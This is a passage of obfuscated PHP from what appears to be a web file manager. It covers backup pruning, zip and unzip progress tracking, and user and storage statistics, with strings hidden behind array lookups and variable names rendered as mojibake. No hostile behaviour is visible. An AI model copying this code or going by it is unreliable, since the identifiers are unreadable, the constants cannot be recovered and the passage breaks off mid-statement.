public function keep() { $©ßÑ¾ö =& $_SERVER[ÅÄÇĞô]; $ÙÑüø¿¥ = self::get(); if (_get($ÙÑüø¿¥, $©ßÑ¾ö[863], 0) == $©ßÑ¾ö[91]) { return; } $this->backupKeep($ÙÑüø¿¥); self::set(array($©ßÑ¾ö[863] => 1)); } private function backupKeep($÷ÎÑ€ü») { $›ü¾ç†Ş =& $_SERVER[ÅÄÇĞô]; if (self::$manual == 1) { return; } $Õñê‡¿ï = $this->model->listData(); if (empty($Õñê‡¿ï)) { return; } $Ûš÷¤§ = 0; $ñüõ¾  = array(); foreach ($Õñê‡¿ï as $â­»İÄ) { if ($Ûš÷¤§ >= 7) { break; } $ñüõ¾ [] = $â­»İÄ[$›ü¾ç†Ş[32]]; $Ûš÷¤§++; } for ($Ûš÷¤§ = 0; $Ûš÷¤§ < 12; $Ûš÷¤§++) { $ñüõ¾ [] = date($›ü¾ç†Ş[864], strtotime("\55{$Ûš÷¤§}\40\x6d\x6f\x6e\x74\x68\163")); } $ñüõ¾  = array_unique($ñüõ¾ ); $Š†ŸŞÜ = Model($›ü¾ç†Ş[865])->get($›ü¾ç†Ş[866]); foreach ($Õñê‡¿ï as $â­»İÄ) { if (isset($â­»İÄ[$›ü¾ç†Ş[850]]) && $â­»İÄ[$›ü¾ç†Ş[850]] == $›ü¾ç†Ş[91]) { continue; } if (!empty($â­»İÄ[$›ü¾ç†Ş[32]]) && in_array($â­»İÄ[$›ü¾ç†Ş[32]], $ñüõ¾ )) { continue; } $this->model->remove($â­»İÄ[$›ü¾ç†Ş[478]]); $¡Ü¡ê¤† = $this->backupPath($÷ÎÑ€ü», $Š†ŸŞÜ); IO::remove($¡Ü¡ê¤†, !1); } } private function backupPath($Ç¬®Ø, $¹œÉª‚ó = false) { $Ñ°Ê£ôô =& $_SERVER[ÅÄÇĞô]; if (!$¹œÉª‚ó) { $¹œÉª‚ó = Model($Ñ°Ê£ôô[865])->get($Ñ°Ê£ôô[866]); } $ØıÚ™©ú = $Ç¬®Ø[$Ñ°Ê£ôô[32]]; $È®óıë“ = substr(md5($Ñ°Ê£ôô[867] . $¹œÉª‚ó . $ØıÚ™©ú), 0, 8); return "\x7b\151\157\x3a{$Ç¬®Ø[$Ñ°Ê£ôô[847]]}\x7d\x2f\144\x61\164\141\x62\141\x73\x65\57\142\x61\x63\x6b\165\x70\57" . $ØıÚ™©ú . $Ñ°Ê£ôô[11] . $È®óıë“; } public function db() { $“ªâêã =& $_SERVER[ÅÄÇĞô]; $®×ã—ê = self::get(); if (_get($®×ã—ê, $“ªâêã[868], 0) == $“ªâêã[91]) { return !0; } $˜Ø×Ô¥„ = new BackupDb(); if (!$˜Ø×Ô¥„->index()) { return !1; } self::set(array($“ªâêã[868] => 1)); return !0; } public function dbFile() { $æÂ¤ˆ—Ü =& $_SERVER[ÅÄÇĞô]; $¿Ïè…êÁ = self::get(); if (_get($¿Ïè…êÁ, $æÂ¤ˆ—Ü[869], 0) == $æÂ¤ˆ—Ü[91]) { return !0; } $éëª›ùú = new BackupDbFile(); if (!$éëª›ùú->index()) { return !1; } self::set(array($æÂ¤ˆ—Ü[869] => 1)); return !0; } public function file() { $ƒ²ğˆ‹’ =& $_SERVER[ÅÄÇĞô]; $òŸª™ = self::get(); if (_get($òŸª™, $ƒ²ğˆ‹’[870], 0) == $ƒ²ğˆ‹’[91]) { return !0; } if ($òŸª™[$ƒ²ğˆ‹’[171]] == $ƒ²ğˆ‹’[871]) { $«üô¯Ñ = new BackupFile(); if (!$«üô¯Ñ->index()) { return !1; } } self::set(array($ƒ²ğˆ‹’[870] => 1, $ƒ²ğˆ‹’[845] => 1)); return !0; } public static function log($‘ôè–´) { write_log($‘ôè–´, $_SERVER[ÅÄÇĞô][872]); } } goto BÌøÚàÅ; D•Ö²çÍæí: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $³‡›€öß =& $_SERVER[ÅÄÇĞô]; parent::startAfter(); Hook::bind($³‡›€öß[1912], array($this, $³‡›€öß[1913])); Hook::bind($³‡›€öß[1301], array($this, $³‡›€öß[1914])); Hook::bind($³‡›€öß[1915], array($this, $³‡›€öß[1916])); $‰ÔÛÔŒº =& $this->task; $‰ÔÛÔŒº[$³‡›€öß[1917]] = $³‡›€öß[1302]; if (!$‰ÔÛÔŒº[$³‡›€öß[1685]]) { $‰ÔÛÔŒº[$³‡›€öß[1685]] = LNG($³‡›€öß[1918]); } } protected function endAfter() { $£ı«İşÙ =& $_SERVER[ÅÄÇĞô]; parent::endAfter(); Hook::unbind($£ı«İşÙ[1912], array($this, $£ı«İşÙ[1913])); Hook::unbind($£ı«İşÙ[1301], array($this, $£ı«İşÙ[1914])); Hook::unbind($£ı«İşÙ[1915], array($this, $£ı«İşÙ[1916])); } public function updateAfter() { $Ø¯¥ºŠ =& $_SERVER[ÅÄÇĞô]; $‡ã—ìş† =& $this->task; if (!$‡ã—ìş†[$Ø¯¥ºŠ[1163]] || !$‡ã—ìş†[$Ø¯¥ºŠ[858]]) { if ($‡ã—ìş†[$Ø¯¥ºŠ[1917]] != $Ø¯¥ºŠ[391]) { return; } } if ($‡ã—ìş†[$Ø¯¥ºŠ[1917]] == $Ø¯¥ºŠ[1302]) { $ö¯ç¹ˆ = 0; if ($‡ã—ìş†[$Ø¯¥ºŠ[1851]]) { $ö¯ç¹ˆ = $‡ã—ìş†[$Ø¯¥ºŠ[1852]] / $‡ã—ìş†[$Ø¯¥ºŠ[1851]]; } $‡ã—ìş†[$Ø¯¥ºŠ[1799]] = $ö¯ç¹ˆ * 0.3; } else { if ($‡ã—ìş†[$Ø¯¥ºŠ[1917]] == $Ø¯¥ºŠ[391]) { $ö¯ç¹ˆ = $‡ã—ìş†[$Ø¯¥ºŠ[1798]] / $‡ã—ìş†[$Ø¯¥ºŠ[1163]]; $‡ã—ìş†[$Ø¯¥ºŠ[1799]] = 0.3 + $ö¯ç¹ˆ * 0.4; } else { if ($‡ã—ìş†[$Ø¯¥ºŠ[1917]] == $Ø¯¥ºŠ[110]) { $“áÃûÌİ = 0; if ($‡ã—ìş†[$Ø¯¥ºŠ[1853]] == $Ø¯¥ºŠ[110]) { $“áÃûÌİ = $‡ã—ìş†[$Ø¯¥ºŠ[1852]]; } $ö¯ç¹ˆ = ($‡ã—ìş†[$Ø¯¥ºŠ[1856]] + $“áÃûÌİ) / $‡ã—ìş†[$Ø¯¥ºŠ[858]]; $‡ã—ìş†[$Ø¯¥ºŠ[1799]] = 0.3 + 0.4 + $ö¯ç¹ˆ * 0.3; } } } if ($‡ã—ìş†[$Ø¯¥ºŠ[1799]] > 0) { $ış¨¸¡¦ = timeFloat() - $‡ã—ìş†[$Ø¯¥ºŠ[1801]] - $‡ã—ìş†[$Ø¯¥ºŠ[1804]]; $‡ã—ìş†[$Ø¯¥ºŠ[1805]] = $ış¨¸¡¦ * (1 - $‡ã—ìş†[$Ø¯¥ºŠ[1799]]) / $‡ã—ìş†[$Ø¯¥ºŠ[1799]]; } } public function addFile($µ³ªÈ) { $ş‚Ó‡°‘ =& $_SERVER[ÅÄÇĞô]; $å†¼ç¢’ =& $this->task; $°ôÕø—— = IO::info($µ³ªÈ); $å†¼ç¢’[$ş‚Ó‡°‘[1849]] = $°ôÕø——[$ş‚Ó‡°‘[32]]; $å†¼ç¢’[$ş‚Ó‡°‘[1851]] = $°ôÕø——[$ş‚Ó‡°‘[79]]; $å†¼ç¢’[$ş‚Ó‡°‘[1852]] = 0; $å†¼ç¢’[$ş‚Ó‡°‘[1165]] = $ş‚Ó‡°‘[1872]; $å†¼ç¢’[$ş‚Ó‡°‘[1853]] = $ş‚Ó‡°‘[1302]; $å†¼ç¢’[$ş‚Ó‡°‘[858]] = $°ôÕø——[$ş‚Ó‡°‘[79]]; $å†¼ç¢’[$ş‚Ó‡°‘[1163]] = 1; $çŞš™Ë = 0; $å†¼ç¢’[$ş‚Ó‡°‘[1860]] = array($ş‚Ó‡°‘[1861] => $çŞš™Ë + 1, $ş‚Ó‡°‘[497] => $°ôÕø——[$ş‚Ó‡°‘[32]], $ş‚Ó‡°‘[87] => $°ôÕø——[$ş‚Ó‡°‘[87]], $ş‚Ó‡°‘[587] => $°ôÕø——[$ş‚Ó‡°‘[587]] ? $°ôÕø——[$ş‚Ó‡°‘[587]] : $°ôÕø——[$ş‚Ó‡°‘[87]]); $this->update(); } public function zipEvent($‘Éû“Åæ, $ªö¹©·—, $™Ş¬€–—, $¾Š‹şş­) { $§å²êß° =& $_SERVER[ÅÄÇĞô]; $è¥™ú˜ø =& $this->task; $è¥™ú˜ø[$§å²êß°[1849]] = get_path_this($ªö¹©·—); $è¥™ú˜ø[$§å²êß°[1851]] = $¾Š‹şş­; $è¥™ú˜ø[$§å²êß°[1852]] = $™Ş¬€–—; $è¥™ú˜ø[$§å²êß°[1165]] = $‘Éû“Åæ == $§å²êß°[1919] ? $§å²êß°[1920] : $§å²êß°[1921]; $è¥™ú˜ø[$§å²êß°[1853]] = $§å²êß°[12]; $è¥™ú˜ø[$§å²êß°[858]] = $¾Š‹şş­; $è¥™ú˜ø[$§å²êß°[1917]] = $§å²êß°[391]; $this->update(); } public function unzipAfter($¤±³£‘ï) { $•Å«ÚŞÇ =& $_SERVER[ÅÄÇĞô]; $€•ö½†û =& $this->task; $€•ö½†û[$•Å«ÚŞÇ[1917]] = $•Å«ÚŞÇ[110]; $åÕÆ = IO::infoWithChildren($¤±³£‘ï); $ÀñıûÄü = 0; $€•ö½†û[$•Å«ÚŞÇ[1860]] = array($•Å«ÚŞÇ[1861] => $ÀñıûÄü + 1, $•Å«ÚŞÇ[497] => $åÕÆ[$•Å«ÚŞÇ[32]], $•Å«ÚŞÇ[87] => $åÕÆ[$•Å«ÚŞÇ[87]], $•Å«ÚŞÇ[587] => $åÕÆ[$•Å«ÚŞÇ[587]] ? $åÕÆ[$•Å«ÚŞÇ[587]] : $åÕÆ[$•Å«ÚŞÇ[87]]); if ($åÕÆ[$•Å«ÚŞÇ[33]] == $•Å«ÚŞÇ[233]) { $€•ö½†û[$•Å«ÚŞÇ[1163]] = 1; } else { $€•ö½†û[$•Å«ÚŞÇ[1163]] = $åÕÆ[$•Å«ÚŞÇ[82]][$•Å«ÚŞÇ[80]]; } $€•ö½†û[$•Å«ÚŞÇ[1165]] = $•Å«ÚŞÇ[12]; $€•ö½†û[$•Å«ÚŞÇ[1853]] = 0; $€•ö½†û[$•Å«ÚŞÇ[1798]] = 0; $€•ö½†û[$•Å«ÚŞÇ[1851]] = 0; $€•ö½†û[$•Å«ÚŞÇ[1852]] = 0; $€•ö½†û[$•Å«ÚŞÇ[1849]] = $•Å«ÚŞÇ[12]; $€•ö½†û[$•Å«ÚŞÇ[1856]] = 0; $€•ö½†û[$•Å«ÚŞÇ[858]] = $åÕÆ[$•Å«ÚŞÇ[79]]; $this->update(); self::log($•Å«ÚŞÇ[1922] . json_encode(array($€•ö½†û, $åÕÆ))); } public function nameParse($ğú“¼ğ—) { $Àì¢Ü½í =& $_SERVER[ÅÄÇĞô]; $×ÀáÇå¡ =& $this->task; if ($×ÀáÇå¡[$Àì¢Ü½í[1917]] == $Àì¢Ü½í[1302]) { $×ÀáÇå¡[$Àì¢Ü½í[1917]] = $Àì¢Ü½í[391]; $×ÀáÇå¡[$Àì¢Ü½í[1856]] = 0; $×ÀáÇå¡[$Àì¢Ü½í[858]] = 0; } $ÆªÎ›Û£ = get_path_this($ğú“¼ğ—); if (strstr($ÆªÎ›Û£, $Àì¢Ü½í[10])) { $×ÀáÇå¡[$Àì¢Ü½í[1798]] += 1; $×ÀáÇå¡[$Àì¢Ü½í[1163]] += 1; } $×ÀáÇå¡[$Àì¢Ü½í[1849]] = $ğú“¼ğ—; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ïÅ¨€ü“ =& $_SERVER[ÅÄÇĞô]; parent::startAfter(); Hook::bind($ïÅ¨€ü“[1923], array($this, $ïÅ¨€ü“[1913])); Hook::bind($ïÅ¨€ü“[1915], array($this, $ïÅ¨€ü“[1916])); $ôã§óË =& $this->task; $ôã§óË[$ïÅ¨€ü“[1917]] = $ïÅ¨€ü“[1302]; if (!$ôã§óË[$ïÅ¨€ü“[1685]]) { $ôã§óË[$ïÅ¨€ü“[1685]] = LNG($ïÅ¨€ü“[1924]); } } protected function endAfter() { $êµœ¤Ğ =& $_SERVER[ÅÄÇĞô]; parent::endAfter(); Hook::unbind($êµœ¤Ğ[1923], array($this, $êµœ¤Ğ[1913])); Hook::unbind($êµœ¤Ğ[1915], array($this, $êµœ¤Ğ[1916])); } public function updateAfter() { $ùşøèË¯ =& $_SERVER[ÅÄÇĞô]; $Ùøàå¥Ğ =& $this->task; if (!$Ùøàå¥Ğ[$ùşøèË¯[1163]] || !$Ùøàå¥Ğ[$ùşøèË¯[858]]) { return; } if ($Ùøàå¥Ğ[$ùşøèË¯[1917]] == $ùşøèË¯[1302]) { $ë±Ğ©ÁÂ = $Ùøàå¥Ğ[$ùşøèË¯[1852]]; if ($Ùøàå¥Ğ[$ùşøèË¯[1853]] != $ùşøèË¯[1302]) { $ë±Ğ©ÁÂ = 0; } $×•¥æ´÷ = ($Ùøàå¥Ğ[$ùşøèË¯[1856]] + $ë±Ğ©ÁÂ) / $Ùøàå¥Ğ[$ùşøèË¯[858]]; $Ùøàå¥Ğ[$ùşøèË¯[1799]] = $×•¥æ´÷ * 0.3; } else { if ($Ùøàå¥Ğ[$ùşøèË¯[1917]] == $ùşøèË¯[391]) { $×•¥æ´÷ = $Ùøàå¥Ğ[$ùşøèË¯[1798]] / $Ùøàå¥Ğ[$ùşøèË¯[1163]]; $Ùøàå¥Ğ[$ùşøèË¯[1799]] = 0.3 + $×•¥æ´÷ * 0.5; } else { if ($Ùøàå¥Ğ[$ùşøèË¯[1917]] == $ùşøèË¯[110]) { $×•¥æ´÷ = 0; if ($Ùøàå¥Ğ[$ùşøèË¯[1851]]) { $×•¥æ´÷ = $Ùøàå¥Ğ[$ùşøèË¯[1852]] / $Ùøàå¥Ğ[$ùşøèË¯[1851]]; } $Ùøàå¥Ğ[$ùşøèË¯[1799]] = 0.3 + 0.5 + $×•¥æ´÷ * 0.2; } } } if ($Ùøàå¥Ğ[$ùşøèË¯[1799]] > 0) { $ô¥•© = timeFloat() - $Ùøàå¥Ğ[$ùşøèË¯[1801]] - $Ùøàå¥Ğ[$ùşøèË¯[1804]]; $Ùøàå¥Ğ[$ùşøèË¯[1805]] = $ô¥•© * (1 - $Ùøàå¥Ğ[$ùşøèË¯[1799]]) / $Ùøàå¥Ğ[$ùşøèË¯[1799]]; } } public function copyFileStart($ôû›Æ®Ÿ, $¯ü–¯©³, $Ÿ¹Û›‰, $ÇºÎùõ, $”Èòã¢, $ Ã†İ¡ë) { $ğÚÀòüİ =& $_SERVER[ÅÄÇĞô]; parent::copyFileStart($ôû›Æ®Ÿ, $¯ü–¯©³, $Ÿ¹Û›‰, $ÇºÎùõ, $”Èòã¢, $ Ã†İ¡ë); $ˆöÕ¸ì£ =& $this->task; if ($ˆöÕ¸ì£[$ğÚÀòüİ[1917]] == $ğÚÀòüİ[391]) { $ˆöÕ¸ì£[$ğÚÀòüİ[1917]] = $ğÚÀòüİ[110]; } $this->update(); } public function copyFileEnd($¿ é„‚ä, $úŠŞ¹‡‰, $©†Ãªˆà, $Ø´¿å¢, $Í¼“ôõ, $êêÑü–È) { $ìñŒƒ¯­ =& $_SERVER[ÅÄÇĞô]; $÷óİÕ»Ç =& $this->task; $÷óİÕ»Ç[$ìñŒƒ¯­[1852]] = $÷óİÕ»Ç[$ìñŒƒ¯­[1851]]; $÷óİÕ»Ç[$ìñŒƒ¯­[1856]] += $÷óİÕ»Ç[$ìñŒƒ¯­[1851]]; $÷óİÕ»Ç[$ìñŒƒ¯­[1853]] = $ìñŒƒ¯­[12]; $this->update(); } public function zipEvent($ü„¡°—Î, $ù¦¿¸, $‚ŠŞ„Ë£, $µõæÚ³±) { $Ššù’” =& $_SERVER[ÅÄÇĞô]; $©Ø‘íºË =& $this->task; $©Ø‘íºË[$Ššù’”[1849]] = get_path_this($ù¦¿¸); $©Ø‘íºË[$Ššù’”[1851]] = $µõæÚ³±; $©Ø‘íºË[$Ššù’”[1852]] = $‚ŠŞ„Ë£; $©Ø‘íºË[$Ššù’”[1165]] = $ü„¡°—Î == $Ššù’”[1925] ? $Ššù’”[1920] : $Ššù’”[1921]; $©Ø‘íºË[$Ššù’”[1853]] = $Ššù’”[12]; $©Ø‘íºË[$Ššù’”[858]] = $µõæÚ³±; $©Ø‘íºË[$Ššù’”[1917]] = $Ššù’”[391]; $this->update(); } public function nameParse($‘Ş–Ü—ï) { $ø‹îÏÑ =& $_SERVER[ÅÄÇĞô]; $Ó¹æìÅĞ =& $this->task; if ($Ó¹æìÅĞ[$ø‹îÏÑ[1798]] < $Ó¹æìÅĞ[$ø‹îÏÑ[1163]]) { $ş±ù¶‹§ = get_path_this($‘Ş–Ü—ï); if (strstr($ş±ù¶‹§, $ø‹îÏÑ[10])) { $Ó¹æìÅĞ[$ø‹îÏÑ[1798]] += 1; } } if ($Ó¹æìÅĞ[$ø‹îÏÑ[1917]] == $ø‹îÏÑ[1302]) { $Ó¹æìÅĞ[$ø‹îÏÑ[1917]] = $ø‹îÏÑ[391]; } $Ó¹æìÅĞ[$ø‹îÏÑ[1849]] = $‘Ş–Ü—ï; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($«şÈ•Î) { $©µŸãÙÔ =& $_SERVER[ÅÄÇĞô]; $àç‘ÁÃ˜ = array($©µŸãÙÔ[670] => array($©µŸãÙÔ[33] => $©µŸãÙÔ[1926], $©µŸãÙÔ[353] => array($©µŸãÙÔ[285], $©µŸãÙÔ[860], $©µŸãÙÔ[1927], $©µŸãÙÔ[1928])), $©µŸãÙÔ[1929] => array($©µŸãÙÔ[33] => $©µŸãÙÔ[1930], $©µŸãÙÔ[353] => array($©µŸãÙÔ[285], $©µŸãÙÔ[858], $©µŸãÙÔ[1931], $©µŸãÙÔ[1932], $©µŸãÙÔ[1933]))); if (!isset($àç‘ÁÃ˜[$«şÈ•Î])) { return !1; } $this->optionType = $àç‘ÁÃ˜[$«şÈ•Î][$©µŸãÙÔ[33]]; $this->field = $àç‘ÁÃ˜[$«şÈ•Î][$©µŸãÙÔ[353]]; return !0; } public function listData($Î¡‚Í  = false, $ùÁ¶±½Ò = "\x6d\x6f\144\x69\x66\x79\x54\x69\155\145", $–¢ÓÃÂÒ = false) { return parent::listData($Î¡‚Í , $ùÁ¶±½Ò, $–¢ÓÃÂÒ); } public function trendList($òÙÍ°å¶) { $ùåìˆ±— =& $_SERVER[ÅÄÇĞô]; $éçÕâı = $this->listData(); if ($éçÕâı) { $ö’úâåµ = end($éçÕâı); $ŸŒ‘÷ = date($ùåìˆ±—[1934], strtotime($ùåìˆ±—[1935])); if ($ö’úâåµ[$ùåìˆ±—[285]] == $ŸŒ‘÷) { return $éçÕâı; } $ëÜªüË¥ = strtotime($ö’úâåµ[$ùåìˆ±—[285]]); } if (!isset($ëÜªüË¥)) { $„Ú…Õ = $òÙÍ°å¶ == $ùåìˆ±—[670] ? $ùåìˆ±—[602] : $ùåìˆ±—[925]; $ëÜªüË¥ = Model($„Ú…Õ)->min($ùåìˆ±—[234]); } $îüŞ²§’ = $ùåìˆ±—[1936] . ucfirst($òÙÍ°å¶); $°ÌˆßÒ‰ = $this->dateList($ëÜªüË¥); foreach ($°ÌˆßÒ‰ as $ŸŒ‘÷) { $this->{$îüŞ²§’}($ŸŒ‘÷); } return $this->listData(); } private function dateList($¯åõğ¹µ) { $ÈÒ’ÉÏ™ =& $_SERVER[ÅÄÇĞô]; $İ¹Õ²òë = $¯åõğ¹µ; $—í¸ßíÒ = strtotime($ÈÒ’ÉÏ™[1935]); $…ÂıŒ¥¥ = array(); while ($İ¹Õ²òë <= $—í¸ßíÒ) { $…ÂıŒ¥¥[] = date($ÈÒ’ÉÏ™[1934], $İ¹Õ²òë); $İ¹Õ²òë = strtotime($ÈÒ’ÉÏ™[1937], $İ¹Õ²òë); } return $…ÂıŒ¥¥; } public function _recordUser($“„ßÄ» = '') { $ã¡àæ =& $_SERVER[ÅÄÇĞô]; $‰ê×ÆÉ = strtotime(date($ã¡àæ[1938], strtotime($“„ßÄ»))); $Ó›ÕŒøÑ = strtotime(date($ã¡àæ[1939], strtotime($“„ßÄ»))); $Ùœèßû½ = array($ã¡àæ[234] => array($ã¡àæ[1113], $Ó›ÕŒøÑ)); $„¹İã = Model($ã¡àæ[602])->where($Ùœèßû½)->count($ã¡àæ[1797]); $Ùœèßû½[$ã¡àæ[234]] = array($ã¡àæ[411], array($‰ê×ÆÉ, $Ó›ÕŒøÑ)); $‘…¡ÅØÔ = Model($ã¡àæ[602])->where($Ùœèßû½)->count($ã¡àæ[1797]); $Ùœèßû½[$ã¡àæ[33]] = $ã¡àæ[1940]; $¨›£ù…• = Model($ã¡àæ[1941])->where($Ùœèßû½)->count($ã¡àæ[1942]); $›é®µÄ° = array($ã¡àæ[285] => $“„ßÄ», $ã¡àæ[860] => (int) $„¹İã, $ã¡àæ[1927] => (int) $‘…¡ÅØÔ, $ã¡àæ[1928] => (int) $¨›£ù…•); return $this->insert($›é®µÄ°); } public function _recordStore($Ë„ëÄ§ò = '') { $‡º¼˜üó =& $_SERVER[ÅÄÇĞô]; $”‰ü´ı = strtotime(date($‡º¼˜üó[1939], strtotime($Ë„ëÄ§ò))); $Œ•­Âƒ = array($‡º¼˜üó[234] => array($‡º¼˜üó[1113], $”‰ü´ı)); $¸š±¤ã¤ = Model($‡º¼˜üó[549])->where($Œ•­Âƒ)->sum($‡º¼˜üó[79]); $Œ•­Âƒ[$‡º¼˜üó[488]] = 0; $Å»ší×é = Model($‡º¼˜üó[925])->where($Œ•­Âƒ)->sum($‡º¼˜üó[79]); $Œ•­Âƒ[$‡º¼˜üó[191]] = 1; $äÑü¸®² = Model($‡º¼˜üó[925])->where($Œ•­Âƒ)->sum($‡º¼˜üó[79]); $Œ•­Âƒ[$‡º¼˜üó[191]] = 2; $Ïš¡É = Model($‡º¼˜üó[925])->where($Œ•­Âƒ)->sum($‡º¼˜üó[79]); $åçÃ™‘Ÿ = array($‡º¼˜üó[285] => $Ë„ëÄ§ò, $‡º¼˜üó[858] => (int) $Å»ší×é, $‡º¼˜üó[1931] => (int) $¸š±¤ã¤, $‡º¼˜üó[1932] => (int) $äÑü¸®², $‡º¼˜üó[1933] => (int) $Ïš¡É); return $this->insert($åçÃ™‘Ÿ); } public function trend($€¤Õ“Í‘, $–ë´–´) { $‚Œ…ü™Ú =& $_SERVER[ÅÄÇĞô]; if (!$this->init($€¤Õ“Í‘)) { return !1; } $û¦ºáÄÄ = $this->trendList($€¤Õ“Í‘); if ($û¦ºáÄÄ && $–ë´–´ != $‚Œ…ü™Ú[1769]) { $ˆÚï–ª… = $û¦ºáÄÄ[0][$‚Œ…ü™Ú[285]]; $ıªŠÓçÔ = $this->validDate($–ë´–´, $ˆÚï–ª…); $È÷áİ™­ = array(); $ğª¢ü¢µ = array_to_keyvalue($û¦ºáÄÄ, $‚Œ…ü™Ú[285]); foreach ($ıªŠÓçÔ as $ÀÌş „) { if (isset($ğª¢ü¢µ[$ÀÌş „])) { $´¢Ë¨áÛ = $ğª¢ü¢µ[$ÀÌş „]; } else { $´¢Ë¨áÛ = end($û¦ºáÄÄ); $´¢Ë¨áÛ[$‚Œ…ü™Ú[285]] = $ÀÌş „; if ($€¤Õ“Í‘ == $‚Œ…ü™Ú[670]) { $´¢Ë¨áÛ[$‚Œ…ü™Ú[1927]] = $´¢Ë¨áÛ[$‚Œ…ü™Ú[1928]] = 0; } } $È÷áİ™­[] = $´¢Ë¨áÛ; } $û¦ºáÄÄ = $È÷áİ™­; } $òÒÎ¸ıû = array($‚Œ…ü™Ú[670] => array($‚Œ…ü™Ú[860] => LNG($‚Œ…ü™Ú[1943]), $‚Œ…ü™Ú[1927] => LNG($‚Œ…ü™Ú[1944]), $‚Œ…ü™Ú[1928] => LNG($‚Œ…ü™Ú[1945])), $‚Œ…ü™Ú[1929] => array($‚Œ…ü™Ú[858] => LNG($‚Œ…ü™Ú[1946]), $‚Œ…ü™Ú[1931] => LNG($‚Œ…ü™Ú[1947]), $‚Œ…ü™Ú[1932] => LNG($‚Œ…ü™Ú[1948]), $‚Œ…ü™Ú[1933] => LNG($‚Œ…ü™Ú[1949]))); $¹Ì†©£ = array($‚Œ…ü™Ú[670] => $‚Œ…ü™Ú[1950], $‚Œ…ü™Ú[1929] => $‚Œ…ü™Ú[79]); if (empty($û¦ºáÄÄ)) { $ÀÌş „ = date($‚Œ…ü™Ú[1934], strtotime($‚Œ…ü™Ú[1935])); $Ç¬•¬Ô¬ = array($‚Œ…ü™Ú[285] => $ÀÌş „); foreach ($òÒÎ¸ıû[$€¤Õ“Í‘] as $¤ü¤ÉÚß => $úûøˆá¬) { $Ç¬•¬Ô¬[$¤ü¤ÉÚß] = 0; } $û¦ºáÄÄ[] = $Ç¬•¬Ô¬; } $’Í¢•Ò¹ = array(); foreach ($û¦ºáÄÄ as $úûøˆá¬) { if ($€¤Õ“Í‘ == $‚Œ…ü™Ú[1929] && $úûøˆá¬[$‚Œ…ü™Ú[1931]] > $úûøˆá¬[$‚Œ…ü™Ú[858]]) { $úûøˆá¬[$‚Œ…ü™Ú[1931]] = $úûøˆá¬[$‚Œ…ü™Ú[858]]; } foreach ($òÒÎ¸ıû[$€¤Õ“Í‘] as $¤ü¤ÉÚß => $ˆÁÂÅ„÷) { $´¢Ë¨áÛ = array($‚Œ…ü™Ú[285] => $úûøˆá¬[$‚Œ…ü™Ú[285]], $‚Œ…ü™Ú[1685] => $ˆÁÂÅ„÷); $´¢Ë¨áÛ[$¹Ì†©£[$€¤Õ“Í‘]] = isset($úûøˆá¬[$¤ü¤ÉÚß]) ? $úûøˆá¬[$¤ü¤ÉÚß] : 0; $’Í¢•Ò¹[] = $´¢Ë¨áÛ; } } return $’Í¢•Ò¹; } public function validDate($ºîÊì–ê, $úÍ£ÆÏ¹) { $ÃíÑ¾İµ =& $_SERVER[ÅÄÇĞô]; $¸Ìà‚‡Ğ = date($ÃíÑ¾İµ[1934], strtotime($ÃíÑ¾İµ[1935])); $Áí°ˆÂš = array($¸Ìà‚‡Ğ); switch ($ºîÊì–ê) { case $ÃíÑ¾İµ[1776]: $°Æ–’ = mktime(0, 0, 0, date($ÃíÑ¾İµ[1951]), date($ÃíÑ¾İµ[1475]) - date($ÃíÑ¾İµ[1566]) + 7 - 7, date($ÃíÑ¾İµ[1952])); $åä´­ä™ = 0; do { $»·÷ü¦À = date($ÃíÑ¾İµ[1934], $°Æ–’ - 3600 * 24 * 7 * $åä´­ä™); $Áí°ˆÂš[] = $»·÷ü¦À; $åä´­ä™++; } while ($úÍ£ÆÏ¹ < $»·÷ü¦À); break; case $ÃíÑ¾İµ[1774]: $åä´­ä™ = 1; do { $¬ÅõÊõ‚ = date($ÃíÑ¾İµ[1953], strtotime("\x2d\40{$åä´­ä™}\x20\155\157\x6e\x74\x68\x73")); $Áí°ˆÂš[] = $¬ÅõÊõ‚; $åä´­ä™++; } while ($úÍ£ÆÏ¹ < $¬ÅõÊõ‚); break; case $ÃíÑ¾İµ[1954]: $øÜõÙµÓ = (int) date($ÃíÑ¾İµ[1952], strtotime($úÍ£ÆÏ¹)); $•ãäÕ¹Õ = (int) date($ÃíÑ¾İµ[1952]); if ($øÜõÙµÓ >= $•ãäÕ¹Õ) { break; } for ($øÜõÙµÓ; $øÜõÙµÓ < $•ãäÕ¹Õ; $øÜõÙµÓ++) { $Áí°ˆÂš[] = $øÜõÙµÓ . $ÃíÑ¾İµ[1955]; } break; default: break; } if ($úÍ£ÆÏ¹ > end($Áí°ˆÂš)) { array_pop($Áí°ˆÂš); } sort($Áí°ˆÂš); return $Áí°ˆÂš; } public function listTable($Ò«éŸ¦˜) { $ïíÌÊ¹ = ucfirst($Ò«éŸ¦˜); return Model($ïíÌÊ¹)->listData(); } public function option($Òœî) { $¶”‡ÃÑæ = $_SERVER[ÅÄÇĞô][1956] . ucfirst($Òœî); return $this->{$¶”‡ÃÑæ}(); } private function optionUser() { $ëê‚šŒí =& $_SERVER[ÅÄÇĞô]; $â³ã¿¢Û = Model($ëê‚šŒí[602])->count($ëê‚šŒí[1797]); $ÚØçöÌ¶ = Model($ëê‚šŒí[602])->where($ëê‚šŒí[1957])->count($ëê‚šŒí[1797]); $ëµ¤ñÎ¸ = intval($GLOBALS[$ëê‚šŒí[6]][$ëê‚šŒí[427]][$ëê‚šŒí[1742]]) / 3600; $°½İÔ”æ = strtotime("\55{$ëµ¤ñÎ¸}\x20\150\157\x75\x72\x73"); $áÚŠãá„ = strtotime(date($ëê‚šŒí[1938])); if ($°½İÔ”æ < $áÚŠãá„) { $°½İÔ”æ = $áÚŠãá„; } $Òİ»¼Øû = array($ëê‚šŒí[1958] => array($ëê‚šŒí[1114], $°½İÔ”æ)); $´­ÊÂÊŸ = (int) Model($ëê‚šŒí[602])->where($Òİ»¼Øû)->count($ëê‚šŒí[1797]); if (!$´­ÊÂÊŸ) { $´­ÊÂÊŸ = 1; } $Òİ»¼Øû = array($ëê‚šŒí[1958] => array($ëê‚šŒí[1114], $áÚŠãá„)); $£ùöì±• = Model($ëê‚šŒí[602])->where($Òİ»¼Øû)->count($ëê‚šŒí[1797]); return array($ëê‚šŒí[853] => (int) $â³ã¿¢Û, $ëê‚šŒí[1959] => (int) ($â³ã¿¢Û - $ÚØçöÌ¶), $ëê‚šŒí[1960] => (int) $ÚØçöÌ¶, $ëê‚šŒí[1961] => (int) $£ùöì±•, $ëê‚šŒí[1962] => 